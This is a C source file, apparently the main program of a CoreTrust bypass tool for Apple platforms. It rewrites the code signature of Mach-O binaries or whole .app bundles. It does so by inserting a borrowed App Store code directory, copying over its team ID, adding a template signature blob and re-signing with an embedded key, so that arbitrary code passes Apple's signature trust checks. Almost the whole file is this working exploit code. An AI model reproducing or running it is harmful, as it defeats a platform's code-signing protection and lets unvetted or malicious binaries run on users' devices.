
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include <choma/Base64.h>
#include "AppStoreCodeDirectory.h"
#include "TemplateSignatureBlob.h"
#include "DecryptedSignature.h"
#include "PrivateKey.h"
#include <copyfile.h>
#include <TargetConditionals.h>

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    if (!fat) return NULL;
    MachO *macho = fat_find_preferred_slice(fat);

#if TARGET_OS_MAC && !TARGET_OS_IPHONE
    if (!macho) {
        // Check for arm64v8 first
        macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64_V8);
        if (!macho) {
            // If that fails, check for regular arm64
            macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64_ALL);
            if (!macho) {
                // If that fails, check for arm64e
                macho = fat_find_slice(fat, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64E);
                if (!macho) {
                    fat_free(fat);
                    return NULL;
                }
            }
        }
    }
#else
    if (!macho) {
        fat_free(fat);
        return NULL;
    }
#endif // TARGET_OS_MAC && !TARGET_OS_IPHONE
    
    char *temp = strdup("/tmp/XXXXXX");
    int fd = mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    close(fd);
    return temp;
}

int extract_blobs(CS_SuperBlob *superBlob, const char *dir)
{
    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superBlob);

    CS_DecodedBlob *blob = decodedSuperblob->firstBlob;
    while (blob) {
        char outPath[PATH_MAX];
        CS_GenericBlob genericBlob;
        csd_blob_read(blob, 0, sizeof(genericBlob), &genericBlob);
        GENERIC_BLOB_APPLY_BYTE_ORDER(&genericBlob, BIG_TO_HOST_APPLIER);

        snprintf(outPath, PATH_MAX, "%s/%x_%x.bin", dir, blob->type, genericBlob.magic);

        uint64_t len = csd_blob_get_size(blob);
        uint8_t blobData[len];
        csd_blob_read(blob, 0, len, blobData);

        FILE *f = fopen(outPath, "wb");
        fwrite(blobData, len, 1, f);
        fclose(f);

        blob = blob->next;
    }
    return 0;
}

char *get_argument_value(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            if (i+1 < argc) {
                return argv[i+1];
            }
        }
    }
    return NULL;
}

bool argument_exists(int argc, char *argv[], const char *flag)
{
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i], flag)) {
            return true;
        }
    }
    return false;
}

void print_usage(const char *self)
{
    printf("Options: \n");
    printf("\t-i: input file\n");
    printf("\t-o: output file\n");
    printf("\t-r: replace input file / replace output file if it already exists\n");
    printf("\t-a: input is an .app bundle\n");
    printf("\t-h: print this help message\n");
    printf("Examples:\n");
    printf("\t%s -i <path to input MachO/FAT file> (-r) (-o <path to output MachO file>)\n", self);
    printf("\t%s -i <path to input .app bundle> -a\n", self);
    exit(-1);
}

// We can use static offsets here because we use a template signature blob
#define SIGNED_ATTRS_OFFSET 0x13C6 // SignedAttributes sequence
#define HASHHASH_OFFSET 0x1470 // SHA256 hash SignedAttribute
#define BASEBASE_OFFSET 0x15AD // Base64 hash SignedAttribute
#define SIGNSIGN_OFFSET 0x1602 // Signature

#define DECRYPTED_SIGNATURE_HASH_OFFSET 0x13

int update_signature_blob(CS_DecodedSuperBlob *superblob)
{
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (!signatureBlob) {
        printf("Could not find signature blob!\n");
        return -1;
    }

    uint8_t fullHash[CC_SHA256_DIGEST_LENGTH];
    size_t dataSizeToRead = csd_blob_get_size(sha256CD);
    uint8_t *data = malloc(dataSizeToRead);
    memset(data, 0, dataSizeToRead);
    csd_blob_read(sha256CD, 0, dataSizeToRead, data);
    CC_SHA256(data, (CC_LONG)dataSizeToRead, fullHash);
    free(data);
    uint8_t secondCDSHA256Hash[CC_SHA256_DIGEST_LENGTH];
    memcpy(secondCDSHA256Hash, fullHash, CC_SHA256_DIGEST_LENGTH);
    // Print the hash
    printf("SHA256 hash: ");
    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        printf("%02x", secondCDSHA256Hash[i]);
    }
    printf("\n");

    size_t base64OutLength = 0;
    char *newBase64Hash = base64_encode(secondCDSHA256Hash, CC_SHA1_DIGEST_LENGTH, &base64OutLength);
    if (!newBase64Hash) {
        printf("Failed to base64 encode hash!\n");
        return -1;
    }

    // Print the base64 hash
    printf("Base64 hash: %.*s\n", CC_SHA256_DIGEST_LENGTH, newBase64Hash);

    int ret = csd_blob_write(signatureBlob, HASHHASH_OFFSET, CC_SHA256_DIGEST_LENGTH, secondCDSHA256Hash);
    if (ret != 0) {
        printf("Failed to write SHA256 hash to signature blob!\n");
        free(newBase64Hash);
        return -1;
    }
    
    ret = csd_blob_write(signatureBlob, BASEBASE_OFFSET, base64OutLength, newBase64Hash);
    if (ret != 0) {
        printf("Failed to write base64 hash to signature blob!\n");
        free(newBase64Hash);
        return -1;
    }

    free(newBase64Hash);

    unsigned char *newSignature = NULL;
    size_t newSignatureSize = 0;

    unsigned char newDecryptedSignature[0x33];
    memset(newDecryptedSignature, 0, 0x33);
    memcpy(newDecryptedSignature, DecryptedSignature, 0x33);

    // Get the signed attributes hash
    unsigned char signedAttrs[0x229];
    memset(signedAttrs, 0, 0x229);
    csd_blob_read(signatureBlob, SIGNED_ATTRS_OFFSET, 0x229, signedAttrs);
    signedAttrs[0] = 0x31;
    
    // Hash
    uint8_t fullAttributesHash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(signedAttrs, (CC_LONG)0x229, fullAttributesHash);
    memcpy(newDecryptedSignature + DECRYPTED_SIGNATURE_HASH_OFFSET, fullAttributesHash, CC_SHA256_DIGEST_LENGTH);

    newSignature = signWithRSA(newDecryptedSignature, DecryptedSignature_len, CAKey, CAKeyLength, &newSignatureSize);

    if (!newSignature) {
        printf("Failed to sign the decrypted signature!\n");
        return -1;
    }

    if (newSignatureSize != 0x100) {
        printf("The new signature is not the correct size!\n");
        free(newSignature);
        return -1;
    }

    ret = csd_blob_write(signatureBlob, SIGNSIGN_OFFSET, newSignatureSize, newSignature);
    free(newSignature);
    return ret;
}

int apply_coretrust_bypass(const char *machoPath)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    CS_DecodedBlob *entitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
    CS_DecodedBlob *derEntitlementsBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS, NULL);

    if (!entitlementsBlob && !derEntitlementsBlob && macho->machHeader.filetype == MH_EXECUTE) {
        printf("Error: Unable to find existing entitlements blobs in executable MachO, please make sure to ad-hoc sign with entitlements before running the bypass.\n");
        csd_blob_free(mainCodeDirBlob);
        if (alternateCodeDirBlob) csd_blob_free(alternateCodeDirBlob);
        macho_free(macho);
        return -1;
    }

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed.\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        return -1;
    }

    printf("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }

    // Append new template blob
    signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, (CS_GenericBlob *)TemplateSignatureBlob);
    csd_superblob_append_blob(decodedSuperblob, signatureBlob);

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)
    // 6. Signature blob

    printf("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        return -1;
    }

    // Set the team ID of the real code directory to the AppStore one
    if (csd_code_directory_set_team_id(realCodeDirBlob, appStoreTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        return -1;
    }

    printf("TeamID set to %s!\n", appStoreTeamID);
    free(appStoreTeamID);

    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
    csd_code_directory_set_flags(realCodeDirBlob, 0);

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirBlob, macho);

    int ret = 0;
    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath)
{
    char *machoPath = extract_preferred_slice(inputPath);
    if (!machoPath) {
        printf("Error: failed to extract preferred slice!\n");
        return -1;
    }
    printf("extracted best slice to %s\n", machoPath);

    int r = apply_coretrust_bypass(machoPath);
    if (r != 0) {
        free(machoPath);
        return r;
    }

    r = copyfile(machoPath, outputPath, 0, COPYFILE_ALL | COPYFILE_MOVE | COPYFILE_UNLINK);
    if (r == 0) {
        chmod(outputPath, 0755);
        printf("Signed file! CoreTrust bypass eta now!!\n");
    }
    else {
        perror("copyfile");
    }

    free(machoPath);
    return r;
}

int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath) {
    // Recursively find all MachO files in the app bundle
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;

    if ((dir = opendir(appBundlePath)) == NULL) {
        perror("opendir");
        return -1;
    }

    while ((entry = readdir(dir)) != NULL) {
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", appBundlePath, entry->d_name);

        if (stat(fullpath, &statbuf) == -1) {
            perror("stat");
            return -1;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                // Recursive call for subdirectories
                apply_coretrust_bypass_to_app_bundle(fullpath);
            }
        } else {
            // Process file
            MemoryStream *stream = file_stream_init_from_path(fullpath, 0, 0, 0);
            if (!stream) {
                printf("Error: failed to open file %s\n", fullpath);
                continue;
            }
            uint32_t magic = 0;
            memory_stream_read(stream, 0, sizeof(magic), &magic);
            if (magic == FAT_MAGIC_64 || magic == MH_MAGIC_64) {
                printf("Applying bypass to %s.\n", fullpath);
                apply_coretrust_bypass_wrapper(fullpath, fullpath);
            }
            memory_stream_free(stream);
        }
    }

    closedir(dir);
    return 0;
}

int main(int argc, char *argv[]) {

    if (argc < 2) {
        print_usage(argv[0]);
    }

    char *input = get_argument_value(argc, argv, "-i");
    char *output = get_argument_value(argc, argv, "-o");
    bool replace = argument_exists(argc, argv, "-r");
    bool appBundle = argument_exists(argc, argv, "-a");
    if (appBundle) {
        if (replace || output) {
            print_usage(argv[0]);
        }

        struct stat s;
        bool inputExists = stat(input, &s) == 0;

        if (!inputExists) {
            print_usage(argv[0]);
        }

        char *dot = strrchr(input, '.');
        if (!dot || strcmp(dot, ".app")) {
            printf("Error: %s is not an app bundle.\n", input);
            return -1;
        }

        printf("Applying CoreTrust bypass to app bundle.\n");
        printf("CoreTrust bypass eta s0n!!\n");
        return apply_coretrust_bypass_to_app_bundle(input);
    }
    
    if (!output && !replace) {
        print_usage(argv[0]);
    }
    if (!output && replace) {
        output = input;
    }

    struct stat s;
    bool inputExists = stat(input, &s) == 0;
    bool outputExists = stat(output, &s) == 0;

    if (!inputExists) {
        print_usage(argv[0]);
    }

    if (outputExists && !replace) {
        printf("Error: Output file already exists, for overwriting use the -r argument\n");
        return -1;
    }

    printf("CoreTrust bypass eta s0n!!\n");
    return apply_coretrust_bypass_wrapper(input, output);
}
